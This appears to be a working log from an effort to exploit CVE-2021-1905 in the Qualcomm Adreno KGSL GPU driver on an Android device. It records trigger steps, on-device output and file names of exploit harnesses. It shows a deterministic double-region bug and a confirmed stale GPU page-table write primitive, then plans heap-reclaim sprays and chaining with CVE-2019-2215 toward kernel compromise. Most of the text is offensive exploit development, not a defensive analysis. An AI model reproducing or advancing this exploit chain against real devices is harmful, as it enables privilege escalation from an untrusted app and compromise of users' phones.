# KGSL on-device results — pending_free / CVE-2021-1905 (2026-10-12, session 8)

Target: RG3205W / msm8953 / Adreno 506 / kernel 3.18.71-perf armv7 / no KASLR /
SELinux enforcing / untrusted_app uid 10042 (Termux).
Harnesses: `binder-exploit/kgsl-pend{,2}.c`, `kgsl-svmdbl.c`, `kgsl-svmstale.c`
(arm32-musl static, served via `upload_server.py` whitelist + `job.sh` poller).

## 0. Correction to the dossier's premise

The dossier's section 1 treats vendor commit `0a4ef64e3f` ("Return mementry only
if pending_free is not set", Deepak Kumar, 2017-05-08, msm-3.18) as the target.
That fix only guards `kgsl_sharedmem_find()` **by gpuaddr** — see the upstream
patch (identical text at `0e42ef24…`, cherry-pick `0a4ef64e3f…`):

```c
 if (GPUADDR_IN_MEMDESC(gpuaddr, &entry->memdesc)) {
-    ret = kgsl_mem_entry_get(entry);
+    if (!entry->pending_free)
+         ret = kgsl_mem_entry_get(entry);
     break;
 }
```

The **actual CVE-2021-1905 patches** were located this session (GitHub commit
search → `Hikari-no-Tenshi/android_kernel_oneplus_sm8150` "Apply google patch
CVE-2021-1905_1/_2 KGSL"). They are:

- **Patch #1 — remove `memdesc->useraddr`/`mapsize`.** A single memdesc can be
  mapped by *multiple processes simultaneously*, so one shared `useraddr` cannot
  identify the vma. Replaced by an `atomic_t map_count` and a `check_vma(hostptr,
  size)` that walks `find_vma` and rejects vmas owned by `kgsl_fops`.
- **Patch #2 — lock `_gpu_set_svm_region()` and bail if `gpuaddr` already set.**
  ```c
  spin_lock(&entry->memdesc.lock);
  if (entry->memdesc.gpuaddr) { spin_unlock(...); return -EBUSY; }
  ... kgsl_mmu_set_svm_region(); entry->memdesc.gpuaddr = addr; kgsl_mmu_map();
  spin_unlock(...);
  ```
  plus `_search_range()` propagating `-EBUSY`.

NVD for CVE-2021-1905: *"Possible use after free due to improper handling of
memory mapping of multiple processes simultaneously."* ⇒ the real bug is the
SVM/`gpuaddr`/`useraddr` sharing, not the 2017 pending_free hardening. Both are
absent from our tree and both are reachable.

## 1. Confirmed on-device

### O1 — a `pending_free` entry is still handed out  (kgsl-pend)
After `GPUMEM_FREE_ID` (pending_free=1), with the entry kept alive by the vma ref:
```
pre-free  GET_INFO(id):  rc=0 ... useraddr=0xac9ec000
FREE_ID:                 rc=0
POST-free GET_INFO(id):  rc=0 ... useraddr=0xac9ec000   <== fix would return -EINVAL
POST-free GET_INFO(gpu): rc=0 ... useraddr=0xac9ec000
re-mmap(id):             Resource busy (useraddr != 0)
after munmap A GET_INFO: rc=-1 errno=22 (entry destroyed)
```

### O2 — resurrection into a second live vma  (kgsl-pend2)
`mremap()` shrink resets the **single shared** `memdesc.useraddr` to 0 (tail
`vm_close`) while the head vma keeps the entry alive; a second `mmap` then passes
`get_mmap_entry()`:
```
E id=1 gpu=0x300000 size=0x2000
mmap(2p) -> vmaA=0xb664b000
FREE_ID  -> pending_free=1
mremap shrink 2p->1p -> va_addr=0x0 (entry still findable: GET_INFO rc=0)
re-mmap(gpu) -> SUCCESS vmaB=0xb6649000   [find(gpuaddr) path — exactly the 2017 fix]
re-mmap(id)  -> SUCCESS vmaB=0xb6649000   [find_id path]
readback vmaA[0]=0x5c vmaB[0]=0x5c       (both vmas alias the same pages)
```
⇒ a `pending_free` entry can be re-published into a new mapping, deterministically.

### Fork does NOT preserve the vma (kgsl-pend)
`vmflags = 0x4060000` = `VM_DONTDUMP | VM_DONTEXPAND | VM_DONTCOPY`; `dup_mmap()`
skips `VM_DONTCOPY` vmas before the `vm_ops->open` call, so the fork-based O2
attempt correctly showed the entry destroyed on parent munmap. Fork is a dead end
for the kgsl mapping; the mremap-shrink trick above replaces it.

### Deterministic CVE-2021-1905 patch#2 trigger — NO RACE NEEDED  (kgsl-svmdbl)
```
[1] GPUOBJ_ALLOC size=0x2000 flags=USE_CPU_MAP -> id=1  (SVM confirmed, flags 0x100c0000)
[2] mmap#1 -> v1=0xa8e7a000
      INFO gpuaddr=0xa8e7a000 va_addr=0xa8e7a000
[3] mremap shrink 0x2000->0x1000 -> ok
      INFO gpuaddr=0xa8e7a000 va_addr=0x0
[4] mmap#2 -> v2=0xa8e76000
      INFO gpuaddr=0xa8e76000 va_addr=0xa8e76000   <== gpuaddr RE-ASSIGNED
      INFO gpuaddr=0xa8e76000                      <== G1=0xa8e7a000 now untracked
```
Patch #2 would have returned `-EBUSY` at step [4]. The first SVM region
(`0xa8e7a000`) is left registered in the pagetable rbtree and mapped, while the
entry only tracks `G2`; on teardown `kgsl_mmu_put_gpuaddr()` unmaps `G2` only.

The same trick works through the ordinary `mmap` path (no `MAP_FIXED`, no second
process, no race): `get_mmap_entry()` only gates on the shared, resettable
`useraddr`, which patch #1 shows is the very thing that is invalid with multiple
mappings.

## 2b. UPDATE — the stale region IS GPU-writable (kgsl-svmcp / kgsl-svmdual)

tl;dr: a single SVM gpuaddr is CP-writable and CPU-coherent; after the double-region
G1 and G2 map the **same physical pages**, and G1's PTE persists after entry free.

`kgsl-svmcp` (single SVM entry, CP_MEM_WRITE(G,0xBEEF0001)):
```
[A] non-SVM control: mark=0xa5a5a5a5         (CP path sane)
[B] SVM id=3 gpuaddr=0xb008f000 va_addr=0xb008f000
    svm v[0] = 0xbeef0001  <<< SVM GPU WRITE LANDED
    ctrl mark[0] = 0xc0de0002 (CP alive)
```
`kgsl-svmdual` (double region, IB writes G1=A1, G2=B2, marker=C3):
```
E id=3 G1=0xb0855000 G2=0xb0851000 v1=0xb0855000 v2=0xb0851000
G1 alias v1[0] = 0xb2b2b2b2
G2 alias v2[0] = 0xb2b2b2b2   <- G1 and G2 alias the same pages; G2 overwrote G1
marker   mark  = 0xc3c3c3c3   <- CP survived
```
So the second `_gpu_set_svm_region` does **not** move the mapping: both GPU VAs still
resolve to E's pages. After `GPUOBJ_FREE(E)` + munmap, `kgsl_mmu_put_gpuaddr()` unmaps
G2 only; the `svmstale` run showed the CP still executes a write to G1 (marker liveness
write landed). ⇒ the stale-PTE write primitive is real; what remains is reliable reclaim
and a verification/payoff target.

## 2. OLD note (superseded): stale SVM gpuaddr appeared not CP-writable

`kgsl-svmstale` built the double-region, then tried to write the stale `G1` with
`CP_MEM_WRITE`:
```
[0] cmd gpu=0x300000 | marker gpu=0x310000 | ctx=11
[1] E id=3 G1=0xb0d17000 G2=0xb0d13000 DOUBLE-REGION OK
    submit[prefree]  rc=0 mark=0x00000000            (CP did not write marker)
[1b] v1[0]=0x11111111  (G1 write did not land either)
[2] E freed + vmas unmapped
[3] sprayed 96 objects
    submit[staleG1]  rc=0 mark=0x5a5a5a5a            (marker DID land this time)
[4] magic not found in sprayed objects
```
Two independent problems remain:
1. `CP_MEM_WRITE` to the SVM `gpuaddr` (`0xb0d…`) did **not** land even *before*
   teardown, while a plain-IB `CP_MEM_WRITE` to the non-SVM marker (`0x310000`)
   works (`kgsl-cp`, and the `[staleG1]` marker write here). ⇒ the SVM region is
   not (or no longer) mapped in the GPU view even though the CPU sees it, so the
   CP faults on the G1 packet in the prefree case. This is unexpected and is the
   immediate blocker.
2. Even if G1 stayed mapped, 96×8 KiB objects did not visibly reclaim the freed
   2-page allocation; a dedicated page-reclaim spray (page tables / `msg_msg` /
   `setxattr`, or many more allocations) is required.

## 3. Next experiments (ordered)

1. **Is the SVM gpuaddr mapped for the GPU at all?** Have the CP write `G1` and
   then read v1/v2 on CPU *before* any teardown, and vice versa: write v1 on CPU
   and read via a CP-visible marker? Actually: build the entry, `mmap` it, and
   submit `CP_MEM_WRITE(G1, val)`; read v1. If it never lands, the SVM gpuaddr is
   not in the GPU pagetable until a later step (e.g. `kgsl_mmu_map` is only for
   the *non-SVM* path? check `_gpu_set_svm_region` on the device binary).
   If it does land only for a fragment, the patch#2 bug may instead be a
   *CPU-side* double region / stale rbtree-node UAF, which is exploitable
   differently (e.g. `_insert_gpuaddr` `else BUG()` overlap).
2. **Reconcile with `kgsl-svm3` earlier result** (`GPUOBJ_INFO` layout was wrong
   then). Correct layout confirmed this session: `{gpuaddr,flags,size,va_len,
   va_addr,id}`; `va_addr` = `memdesc.useraddr`.
3. **Reclaim**: spray with `msg_msg` (kmalloc-256/4k) and page tables; then verify
   via the CVE-2019-2215 physmap read (locate + confirm) instead of a CPU alias.
4. **Patch#1 path (`useraddr` / `check_vma`)**: `memdesc_sg_virt()` uses the
   shared `useraddr` to `get_user_pages`, so two processes mapping one imported
   memdesc can make the kernel pin arbitrary user pages (or the wrong vma). Test
   with `GPUOBJ_IMPORT` type `KGSL_USER_MEM_TYPE_ADDR` (0x48, confirmed) +
   multiple mappings.
5. Keep the 2017 `pending_free` path (O1/O2) as a facilitator: it lets a freed /
   owner-relinquished entry be re-published; combined with the 1905 shared private
   it may widen the reclaim window.

## 4. Evidence / artifacts

- `binder-exploit/kgsl-pend.c` → O1 + fork-negative; `kgsl-pend2.c` → O2.
- `binder-exploit/kgsl-svmdbl.c` → deterministic patch#2 trigger.
- `binder-exploit/kgsl-svmstale.c` → stale-PTE/CP attempt (blocked).
- Device uploads: `uploads/upload-20261012-122127…` (O1), `…122705…` (O2),
  `…122908…` (patch#2), `…123419…` (stale/CP).
- Upstream refs: `0e42ef24…` (2017 `find` guard), CVE-2021-1905 patches
  `d6770f2b86b6` (useraddr/map_count) + `be897e2fa155` (SVM gpuaddr lock).
- Device healthy throughout; CP still alive after every run.
